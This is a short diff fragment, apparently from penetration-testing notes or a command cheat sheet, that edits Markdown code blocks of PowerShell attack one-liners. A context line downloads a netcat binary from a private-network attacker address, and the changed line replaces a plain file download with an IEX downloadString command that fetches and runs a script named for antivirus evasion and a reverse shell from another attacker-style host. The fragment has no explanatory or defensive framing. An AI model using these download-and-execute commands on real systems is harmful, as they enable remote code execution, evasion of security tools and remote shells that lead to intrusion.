@@ -87,7 +87,7 @@ iwr -uri http://192.168.45.171/nc.exe -o nc.exe
 ```
 
 ```
-(New-Object System.Net.WebClient).DownloadFile('http://192.168.45.171/nc.exe', 'nc.exe')
+IEX(New-Object Net.WebClient).downloadString("http://10.10.14.57/av_evasion_rev.ps1")
 ```
 
 ```
